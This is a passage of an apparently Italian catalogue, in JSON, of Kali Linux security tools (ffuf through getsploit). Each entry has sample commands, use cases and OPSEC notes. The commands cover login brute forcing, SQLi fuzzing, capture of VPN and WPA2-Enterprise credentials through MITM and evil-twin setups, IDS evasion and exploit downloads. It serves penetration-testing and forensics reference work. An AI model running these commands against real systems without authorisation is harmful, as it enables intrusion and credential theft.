    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>FFUF</strong> (Fuzz Faster U Fool) è un web fuzzer estremamente veloce scritto in Go. Permette fuzzing di qualsiasi parte di una request HTTP: URL, parametri GET/POST, header, cookie, vhost. La keyword FUZZ indica dove inserire i payload dalla wordlist. Tool di riferimento per content discovery.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Universal Fuzzing:</strong> Fuzz qualsiasi parte della request.</p><p><strong>Filter/Match:</strong> Filtra risultati per status, size, words, lines, time, regex.</p><p><strong>Multiple Keywords:</strong> Usa FUZZ, FUZZ2, etc. per fuzzing multiplo.</p><p><strong>Recursion:</strong> Ricorsione automatica opzionale.</p><p><strong>Output Formats:</strong> JSON, CSV, HTML per integrazione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Directory fuzzing con auto-calibration e estensioni\nffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \\\n  -e .php,.html,.txt,.bak -ac -recursion -recursion-depth 2\n\n# VHost enumeration con filter dinamico\nffuf -u http://target.com -H \"Host: FUZZ.target.com\" -w subdomains.txt -fs 0 -mc all\n\n# POST parameter fuzzing per SQLi\nffuf -u https://target.com/login -X POST -d \"user=admin&amp;pass=FUZZ\" \\\n  -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt -fr \"error|syntax|mysql\"\n\n# Multi-keyword fuzzing (username:password)\nffuf -u https://target.com/login -X POST -d \"user=FUSER&amp;pass=FPASS\" \\\n  -w users.txt:FUSER -w passwords.txt:FPASS -fc 401 -mode clusterbomb\n\n# API endpoint discovery con autenticazione\nffuf -u https://api.target.com/v1/FUZZ -w api_endpoints.txt \\\n  -H \"Authorization: Bearer TOKEN\" -mc 200,201,401 -o api_results.json -of json\n\n# Rate limited scan via proxy\nffuf -u https://target.com/FUZZ -w wordlist.txt -rate 10 -p 0.5 \\\n  -x http://127.0.0.1:8080 -replay-proxy http://127.0.0.1:8080\n\n# Match response time per timing attacks\nffuf -u https://target.com/api?id=FUZZ -w nums.txt -ft \"&gt;500\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Content Discovery</strong>, trova directory e file nascosti.</p><p>Nel <strong>Bug Bounty</strong>, enumera parametri e vhost.</p><p><strong>Pentest</strong> per fuzzing completo di applicazioni web.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Noisy:</strong> Molte request in poco tempo. Usa -rate per limitare velocità. User-agent modificabile.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "fierce",
    "name": "fierce",
    "version": "1.6.0",
    "icon": "../app/icons/fierce-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/fierce/",
    "desc": "Scanner DNS per trovare target non contigui e spazio IP associato a un dominio.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Fierce</strong> è uno scanner DNS specializzato nella ricognizione che cerca di mappare lo spazio IP non contiguo associato a un dominio target. A differenza di scanner che si limitano a subdomain bruteforcing, Fierce combina multiple tecniche DNS per trovare server e host che potrebbero non essere ovvi, inclusi server ospitati in range IP completamente diversi dal blocco principale dell'organizzazione, cloud resources, CDN e infrastruttura distribuita geograficamente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Zone Transfer Attempt:</strong> come primo step tenta sempre AXFR (DNS zone transfer) che, se misconfigured e permesso, rivela l'intero contenuto della zona DNS in un colpo solo - ancora sorprendentemente comune su DNS server mal configurati.</p><p><strong>Intelligent Subdomain Bruteforce:</strong> esegue brute force di subdomain usando wordlist ottimizzate, identificando host attivi e risolvendo i loro indirizzi IP per mappare l'infrastruttura esposta.</p><p><strong>Adjacent IP Discovery:</strong> quando trova un host, esegue reverse DNS lookup sugli IP adiacenti (es. se trova 10.0.0.5, testa 10.0.0.1-10.0.0.254) per scoprire altri server nello stesso range che potrebbero appartenere al target.</p><p><strong>Wildcard Detection:</strong> identifica e gestisce configurazioni DNS wildcard che risponderebbero positivamente a qualsiasi subdomain query, evitando falsi positivi massivi durante il bruteforce.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan standard di un dominio\nfierce --domain target.com\n\n# Con wordlist custom per subdomain\nfierce --domain target.com --subdomain-file /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n\n# Range scan esteso (più IP adiacenti)\nfierce --domain target.com --wide\n\n# Salva output su file\nfierce --domain target.com --file output.txt\n\n# Con DNS server specifico\nfierce --domain target.com --dns-servers 8.8.8.8\n\n# Delay tra query (stealth)\nfierce --domain target.com --delay 0.5\n\n# Scan con traversal range più ampio\nfierce --domain target.com --traverse 50</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Initial Reconnaissance</strong>, mappare rapidamente l'infrastruttura DNS di un target identificando host, subdomain e range IP associati come primo step di un penetration test.</p><p>Per <strong>Distributed Infrastructure Discovery</strong>, trovare server e risorse ospitati in range IP non contigui, cloud provider diversi o CDN che potrebbero sfuggire a scan IP-based tradizionali.</p><p>Per <strong>Attack Surface Mapping</strong>, identificare tutti i punti di ingresso potenziali di un'organizzazione esplorando sistematicamente il loro footprint DNS.</p><p>Per <strong>Zone Transfer Testing</strong>, verificare se i DNS server del target sono vulnerabili a zone transfer non autorizzati che esporrebbero l'intera configurazione DNS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> le query DNS sono facilmente loggabili dai DNS server e possono essere monitorate. Volume elevato di query per subdomain bruteforce è riconoscibile. Tool più moderni come Amass, Subfinder e DNSRecon offrono funzionalità più complete e tecniche passive. Fierce rimane utile per scan rapidi e come tool didattico per comprendere DNS reconnaissance.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "fiked",
    "name": "fiked",
    "version": "0.0.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/fiked/",
    "desc": "Fake IKE daemon per intercettare credenziali VPN IPsec in attacchi MITM.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Fiked</strong> (Fake IKE Daemon) è uno strumento specializzato per attacchi man-in-the-middle contro VPN IPsec che utilizzano IKE (Internet Key Exchange) in modalità aggressiva. Emula un gateway VPN legittimo per ingannare i client e catturare le credenziali di autenticazione, inclusi Pre-Shared Keys (PSK) e credenziali XAUTH (username/password). È uno strumento fondamentale per dimostrare le debolezze delle configurazioni VPN legacy che ancora utilizzano IKEv1 Aggressive Mode.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>IKE Gateway Emulation:</strong> Implementa un server IKE completo che risponde alle richieste dei client VPN. Supporta IKEv1 Phase 1 in Aggressive Mode, la configurazione vulnerabile che espone l'hash della PSK nella prima risposta.</p><p><strong>PSK Hash Capture:</strong> Intercetta e registra gli hash delle Pre-Shared Keys scambiati durante la negoziazione IKE. Questi hash possono essere successivamente crackati offline per recuperare la PSK in chiaro.</p><p><strong>XAUTH Credential Harvesting:</strong> Dopo la Phase 1, molte VPN utilizzano XAUTH per autenticazione utente aggiuntiva. Fiked cattura username e password trasmessi in questa fase, spesso in forma recuperabile.</p><p><strong>Transform Set Negotiation:</strong> Gestisce automaticamente la negoziazione dei parametri crittografici (encryption, hash, DH group) per accettare qualsiasi configurazione client, massimizzando la compatibilità.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Fiked richiede una posizione MITM precedentemente stabilita (ARP spoofing, DNS poisoning, o compromissione del gateway).</p><pre><code># Avvia fake gateway con IP del gateway reale\nsudo fiked -g 192.168.1.1 -k\n\n# Con logging verboso per debug\nsudo fiked -g 192.168.1.1 -k -v\n\n# Specifica interfaccia di ascolto\nsudo fiked -g 192.168.1.1 -k -i eth0\n\n# Salva catture in file\nsudo fiked -g 192.168.1.1 -k -o captured_creds.txt\n\n# Dopo la cattura, crack della PSK con ike-scan\nike-scan --pskcrack=hash.txt -B wordlist.txt</code></pre><p>I client VPN si connetteranno al fake gateway credendo sia quello legittimo. Le credenziali catturate appariranno nel log o nel file specificato.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>VPN Security Assessment</strong>, fiked dimostra concretamente i rischi di configurazioni IKEv1 Aggressive Mode, convincendo i clienti a migrare a IKEv2 o modalità Main Mode.</p><p>In operazioni di <strong>Red Team</strong> con accesso alla rete interna, può catturare credenziali VPN di utenti remoti, potenzialmente fornendo accesso persistente da fuori la rete.</p><p>Per <strong>Security Awareness Training</strong>, mostra praticamente perché le VPN legacy sono pericolose e perché è importante verificare l'autenticità dei gateway prima di connettersi.</p><p>Nel <strong>Penetration Testing</strong> di infrastrutture legacy, identifica VPN ancora configurate con parametri vulnerabili.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Prerequisiti:</strong> Richiede posizione MITM già stabilita tramite ARP spoofing, DHCP spoofing, o compromissione del routing. Senza MITM, i client non raggiungeranno il fake gateway.</p><p><strong>Limitazioni:</strong> Inefficace contro IKEv2 o IKEv1 Main Mode che non espongono l'hash PSK. VPN con autenticazione basata su certificati sono immuni. I client moderni potrebbero validare il certificato del gateway.</p><p><strong>Rilevamento:</strong> L'ARP spoofing necessario per MITM è facilmente rilevabile. Il mismatch di certificati o fingerprint può generare warning sui client. IDS possono identificare il traffico IKE anomalo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "finalrecon",
    "name": "finalrecon",
    "version": "1.1.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/finalrecon/",
    "desc": "Tool OSINT all-in-one per ricognizione web: whois, header, SSL, crawler, subdomain.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>FinalRecon</strong> è un tool OSINT all-in-one per ricognizione web automatizzata. Combina whois lookup, analisi header, info certificato SSL, web crawling, enumerazione subdomain e wayback machine in un unico strumento. Genera report comprensivi per assessment rapidi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>WHOIS:</strong> Lookup informazioni registrazione dominio.</p><p><strong>SSL Analysis:</strong> Estrae info da certificati SSL.</p><p><strong>Header Analysis:</strong> Analizza header HTTP per info.</p><p><strong>Subdomain Enum:</strong> Cerca subdomain da fonti multiple.</p><p><strong>Web Crawling:</strong> Crawla il sito per URL e risorse.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan completo\nfinalrecon --full https://target.com\n\n# Solo header e SSL\nfinalrecon --headers --sslinfo https://target.com\n\n# Subdomain\nfinalrecon --sub https://target.com\n\n# Export output\nfinalrecon --full https://target.com -o report.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Quick Recon</strong>, assessment iniziale rapido di un target.</p><p>Nel <strong>Bug Bounty</strong>, raccolta info veloce su nuovo scope.</p><p><strong>OSINT</strong> per profiling base di organizzazioni.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active:</strong> Alcune funzioni sono attive (crawl). WHOIS e SSL sono passive. Lascia log sul target.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "findomain",
    "name": "findomain",
    "version": "10.0.1",
    "icon": "../app/icons/findomain-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/findomain/",
    "desc": "Enumerazione sottodomini velocissima usando API multiple (CT logs, DNS, scraping).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Findomain</strong> è un tool di subdomain enumeration estremamente veloce scritto in Rust. Interroga multiple fonti (Certificate Transparency logs, API di servizi DNS, motori di ricerca) per trovare subdomain senza brute forcing. Supporta monitoring continuo e notifiche per nuovi subdomain.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Source:</strong> Usa 10+ fonti per enumerazione.</p><p><strong>CT Logs:</strong> Cerca in Certificate Transparency logs.</p><p><strong>High Speed:</strong> Scritto in Rust per performance.</p><p><strong>Monitoring:</strong> Monitora nuovi subdomain nel tempo.</p><p><strong>Resolution:</strong> Risolve subdomain trovati opzionalmente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumera con risoluzione e output multipli\nfindomain -t target.com -r -o --output-file subs.txt\n\n# Bulk scan da lista domini\nfindomain -f domains.txt -r -u subdomains.txt\n\n# Con tutte le API configurate\nexport SPYSE_TOKEN=xxx\nexport VIRUSTOTAL_TOKEN=xxx\nfindomain -t target.com -r\n\n# Monitoring con webhook notifiche\nfindomain -t target.com --monitoring \\\n  --discord-webhook \"https://discord.com/api/webhooks/xxx\"\n\n# Pipeline completa: enum -&gt; probe -&gt; scan\nfindomain -t target.com -q -r | httpx -silent | nuclei -t cves/\n\n# Solo IP unique (no duplicati)\nfindomain -t target.com -r --ip-only | sort -u\n\n# Export JSON per analisi\nfindomain -t target.com -r -o --json\n\n# Esclusione pattern\nfindomain -t target.com --exclude \"test,dev,staging\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Subdomain Discovery</strong>, alternativa veloce a subfinder/amass.</p><p>Nel <strong>Bug Bounty</strong>, enumerazione rapida di nuovi scope.</p><p><strong>Monitoring</strong> per asset discovery continua.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Passive:</strong> Non genera traffico verso il target direttamente. Query a servizi terzi potrebbero essere loggabili.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "firewalk",
    "name": "firewalk",
    "version": "5.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/firewalk/",
    "desc": "Determina regole firewall analizzando risposte TTL per mappare ACL di gateway.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Firewalk</strong> è un tool di network reconnaissance che determina quali porte sono permesse attraverso un firewall. Usa la tecnica di IP TTL manipulation: invia pacchetti con TTL impostato per scadere appena oltre il firewall, analizzando le risposte per capire se il pacchetto è passato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>ACL Mapping:</strong> Mappa regole firewall analizzando risposte.</p><p><strong>TTL Analysis:</strong> Usa TTL per determinare passaggio pacchetti.</p><p><strong>Port Scanning:</strong> Verifica porte aperte sul firewall.</p><p><strong>Protocol Support:</strong> TCP e UDP scanning.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan base (gateway, target)\nfirewalk -S1-1000 -i eth0 gateway_ip target_ip\n\n# UDP scan\nfirewalk -S1-1000 -i eth0 -pUDP gateway target\n\n# Verbose\nfirewalk -S1-1000 -i eth0 -v gateway target</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Firewall Testing</strong>, mappa regole ACL.</p><p>Nel <strong>Pentest</strong>, identifica porte permesse attraverso perimetro.</p><p><strong>Network Security</strong> per audit configurazione firewall.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Pacchetti con TTL anomali possono essere rilevati. Alcuni firewall non rispondono in modo prevedibile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Service_Fingerprinting"
    ],
    "notes": null
  },
  {
    "id": "foremost",
    "name": "foremost",
    "version": "1.5.7",
    "icon": "../app/icons/foremost-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/foremost/",
    "desc": "File carving tool forense per recuperare file da immagini disco basandosi su header.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Foremost</strong> è un tool di file carving forense che recupera file da immagini disco basandosi su header, footer e strutture dati interne. Ignora il filesystem e cerca direttamente pattern di file conosciuti. Recupera file anche quando il filesystem è corrotto o cancellato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Header-Based:</strong> Cerca file tramite signature header.</p><p><strong>Multi-Format:</strong> Supporta jpg, png, gif, pdf, doc, exe, zip e altri.</p><p><strong>Configurable:</strong> Aggiungi signature custom in config file.</p><p><strong>Raw Disk:</strong> Lavora su immagini raw e device.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Carving completo con audit file\nforemost -v -T -i disk.img -o /cases/case001/carved/\n\n# Solo documenti (office, pdf)\nforemost -t doc,docx,xls,xlsx,pdf,ppt -i disk.img -o documents/\n\n# Immagini e video\nforemost -t jpg,png,gif,bmp,tif,avi,mov,mpg,wmv -i disk.img -o media/\n\n# Carving da range specifico (offset)\nforemost -i disk.img -o output/ -q  # quiet mode, solo risultati\n\n# Con config custom per signature aggiuntive\ncp /etc/foremost.conf ./custom.conf\n# Aggiungi signature custom\nforemost -c custom.conf -i disk.img -o output/\n\n# Pipeline: dd range -&gt; foremost\ndd if=disk.img bs=512 skip=1000 count=10000 | foremost -T -o partial_carve/\n\n# Carving da RAM dump per artifacts\nforemost -t all -i memory.dmp -o ram_artifacts/\n\n# Solo eseguibili (malware hunting)\nforemost -t exe,dll,sys -i disk.img -o executables/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Digital Forensics</strong>, recupera evidenze da dischi.</p><p>Nel <strong>Data Recovery</strong>, ripristina file da dischi danneggiati.</p><p><strong>Incident Response</strong> per recuperare file cancellati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Best Practice:</strong> Sempre su copia forense, mai su originale. Considera anche scalpel e photorec per formati aggiuntivi.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "05_Forensics",
      "File_Carving"
    ],
    "notes": null
  },
  {
    "id": "fping",
    "name": "fping",
    "version": "5.1",
    "icon": "../app/icons/fping-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/fping/",
    "desc": "Ping parallelo per scansione rapida di host attivi su range di IP multipli.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Fping</strong> è uno strumento simile a ping ma ottimizzato per scansionare host multipli in parallelo. Permette di verificare rapidamente quali host sono attivi in un range di IP, inviando ICMP echo request a molti target simultaneamente invece che sequenzialmente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Parallel Ping:</strong> Scansiona molti host contemporaneamente.</p><p><strong>Range Support:</strong> Accetta CIDR notation e range.</p><p><strong>File Input:</strong> Legge target da file.</p><p><strong>Statistics:</strong> Calcola statistiche su latenza e packet loss.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Discovery veloce: solo host vivi, output pulito\nfping -a -g 192.168.1.0/24 2&gt;/dev/null | tee alive_hosts.txt\n\n# Scan multipli range con timeout ridotto\nfping -a -r 1 -t 100 -g 10.0.0.0/24 172.16.0.0/24 192.168.0.0/24 2&gt;/dev/null\n\n# Con statistiche dettagliate\nfping -s -c 3 -g 192.168.1.0/24\n\n# Output per nmap (solo IP)\nfping -a -g 192.168.1.0/24 2&gt;/dev/null &gt; targets.txt\nnmap -iL targets.txt -sV\n\n# Genera range da netmask alternativo\nfping -a -g 192.168.1.1 192.168.1.254 2&gt;/dev/null\n\n# Loop monitoring\nfping -l -p 1000 -B 1.5 server1 server2 server3\n\n# Pipeline con masscan per porte\nfping -a -g 10.0.0.0/8 2&gt;/dev/null | \\\n  xargs -I{} masscan {} -p80,443,22 --rate=1000\n\n# Quiet con conteggio risultati\nfping -a -q -g 192.168.0.0/16 2&gt;/dev/null | wc -l</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Host Discovery</strong>, identifica rapidamente host attivi.</p><p>Nel <strong>Network Mapping</strong>, primo step di ricognizione.</p><p><strong>Monitoring</strong> per verificare disponibilità di server.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> ICMP può essere bloccato/loggato. Alcuni host non rispondono a ping ma sono attivi. Usa in combinazione con altre tecniche.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "fragrouter",
    "name": "fragrouter",
    "version": "1.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/fragrouter/",
    "desc": "IDS evasion toolkit che frammenta pacchetti per bypassare sistemi di rilevamento.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Fragrouter</strong> è un tool per IDS evasion che intercetta e manipola pacchetti di rete per evadere sistemi di rilevamento intrusioni. Frammenta, riordina e modifica il traffico in modi che confondono gli IDS ma vengono riassemblati correttamente dal target. Toolkit storico per testing IDS.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Fragmentation:</strong> Frammenta pacchetti in modi evasivi.</p><p><strong>Reordering:</strong> Invia frammenti fuori ordine.</p><p><strong>Overlapping:</strong> Crea frammenti sovrapposti per confondere IDS.</p><p><strong>Multiple Modes:</strong> Diversi metodi di evasione configurabili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia con frammentazione base\nfragrouter -B1\n\n# Ordered 8-byte fragments\nfragrouter -F1\n\n# Random fragment order\nfragrouter -F2\n\n# Lista modi disponibili\nfragrouter -h</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>IDS Testing</strong>, verifica se l'IDS rileva traffico frammentato.</p><p>Nel <strong>Red Team</strong>, evade detection durante attacchi.</p><p><strong>Research</strong> su tecniche di evasione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Datato:</strong> IDS moderni gestiscono meglio frammentazione. Tool storico, considera alternative più recenti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Evasion"
    ],
    "notes": null
  },
  {
    "id": "freeradius-wpe",
    "name": "freeradius-wpe",
    "version": "3.2.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/freeradius-wpe/",
    "desc": "FreeRADIUS patchato per catturare credenziali PEAP/MSCHAPv2 in evil twin attacks.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>FreeRADIUS-WPE</strong> (Wireless Pwnage Edition) è FreeRADIUS patchato per attacchi a reti WPA2-Enterprise. Invece di autenticare, logga le credenziali PEAP/MSCHAPv2 ricevute dai client che si connettono al fake AP. Cattura username e challenge/response per cracking offline.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Credential Logging:</strong> Logga tutte le credenziali ricevute.</p><p><strong>MSCHAPv2 Capture:</strong> Cattura challenge/response per cracking.</p><p><strong>PEAP Support:</strong> Gestisce autenticazione PEAP completa.</p><p><strong>hostapd Integration:</strong> Si integra con hostapd per evil twin.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Configura e avvia\nradiusd -X\n\n# I log delle credenziali in\ntail -f /var/log/freeradius/radius.log\n\n# Usa con hostapd configurato per WPA-Enterprise\n# Combinato con eaphammer per setup automatico</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi Pentesting</strong>, cattura credenziali enterprise.</p><p>Nel <strong>Red Team</strong>, ottiene account domain via WiFi.</p><p><strong>Lab Setup</strong> per testing autenticazione RADIUS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Evil twin rilevabile da WIDS. Certificate mismatch può alertare utenti attenti. Usa eaphammer per setup più semplice.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "getallrepos",
    "name": "getallrepos",
    "version": "1.0.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/getallrepos/",
    "desc": "Scarica tutti i repository GitHub di un utente o organizzazione per analisi offline.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>GetAllRepos</strong> scarica automaticamente tutti i repository Git di un utente o organizzazione GitHub/GitLab. Utile per analisi offline del codice, ricerca di secret, audit di sicurezza e backup. Supporta clonazione parallela per velocità.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Bulk Clone:</strong> Scarica tutti i repo di un utente/org.</p><p><strong>GitHub/GitLab:</strong> Supporta entrambe le piattaforme.</p><p><strong>Parallel Download:</strong> Clonazione parallela per velocità.</p><p><strong>Authentication:</strong> Supporta token per repo privati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scarica tutti i repo di un utente\ngetallrepos -u username -o output_dir/\n\n# Di un'organizzazione\ngetallrepos -org orgname -o repos/\n\n# Con token per repo privati\ngetallrepos -u user -t GITHUB_TOKEN -o output/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Code Audit</strong>, analizza tutto il codice di un target.</p><p>Nel <strong>Bug Bounty</strong>, cerca vulnerabilità in repository pubblici.</p><p><strong>Secret Hunting</strong> per trovare credenziali leak.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Public Data:</strong> Scarica solo dati pubblicamente accessibili (senza token). Rate limiting di GitHub può limitare download.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "getsploit",
    "name": "getsploit",
    "version": "1.0.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/getsploit/",
    "desc": "Cerca e scarica exploit da database multipli (Exploit-DB, Metasploit, PacketStorm).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Getsploit</strong> è un tool da command line per cercare e scaricare exploit da database multipli online simultaneamente. Interroga via API i principali repository di exploit: Exploit-DB, Metasploit Modules, PacketStorm Security, e il database Vulners che aggrega informazioni da centinaia di fonti. A differenza di searchsploit che cerca in un database locale (che richiede aggiornamenti manuali), getsploit fornisce risultati sempre aggiornati in tempo reale. Particolarmente utile per trovare rapidamente PoC per vulnerabilità recenti non ancora incluse nei database offline.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Database Aggregation:</strong> Cerca simultaneamente in Exploit-DB, Metasploit modules, PacketStorm, e Vulners. I risultati vengono deduplicati e ordinati per rilevanza, presentando una vista unificata di tutti gli exploit disponibili pubblicamente.</p><p><strong>Real-Time Updates:</strong> A differenza dei database locali, ogni ricerca interroga le API in tempo reale. Exploit pubblicati oggi sono immediatamente ricercabili senza necessità di aggiornare database locali.</p><p><strong>Direct Download:</strong> Con il flag -d, scarica automaticamente gli exploit trovati nella directory corrente. Supporta download batch per più exploit contemporaneamente.</p><p><strong>Advanced Search:</strong> Ricerca per prodotto e versione, per numero CVE, per tipo di exploit (remote, local, webapp), o combinazioni. Supporta operatori booleani per query complesse.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Sintassi simile a searchsploit ma con funzionalità aggiuntive per ricerca online.</p><pre><code># Ricerca semplice per prodotto e versione\ngetsploit apache 2.4.49\ngetsploit openssh 7.2\n\n# Ricerca per CVE specifico\ngetsploit CVE-2021-44228\ngetsploit CVE-2023-23397\n\n# Ricerca e download automatico exploit\ngetsploit -d windows smb eternalblue\n\n# Limita numero risultati\ngetsploit -l 20 wordpress\n\n# Ricerca per tipo di exploit\ngetsploit type:remote apache\ngetsploit type:local linux kernel\n\n# Mostra solo titoli (output compatto)\ngetsploit -t joomla\n\n# Output JSON per parsing automatizzato\ngetsploit -j wordpress 5.0 > results.json\n\n# Combinazione con altri tool\ngetsploit -d -l 5 \"$(nmap -sV target | grep -i apache)\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Vulnerability Assessment</strong>, dopo aver identificato software e versioni con nmap o altri scanner, getsploit trova rapidamente exploit disponibili. La ricerca online garantisce risultati aggiornati incluse vulnerabilità zero-day recentemente pubblicate.</p><p>Nel <strong>Penetration Testing</strong>, complementa searchsploit per trovare PoC che potrebbero non essere ancora nel database offline di Exploit-DB. Utile quando si lavora con tecnologie nuove o versioni recenti.</p><p>Per <strong>Security Research</strong>, la ricerca CVE permette di trovare tutti i PoC pubblicati per una vulnerabilità specifica, confrontando implementazioni diverse e identificando la più affidabile.</p><p>Durante <strong>Incident Response</strong>, quando si analizza un breach, getsploit aiuta a identificare rapidamente quali exploit pubblici esistono per le vulnerabilità identificate come vettore di attacco.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Internet Required:</strong> Richiede connessione internet attiva. Non utilizzabile in ambienti air-gapped. Per ricerche offline, usare searchsploit con database locale.</p><p><strong>Query Logging:</strong> Le ricerche vengono inviate a server esterni (Vulners API). Il provider può loggare query e IP sorgente. In operazioni sensibili, considerare le implicazioni di rivelare interessi di ricerca.</p><p><strong>Exploit Verification:</strong> Gli 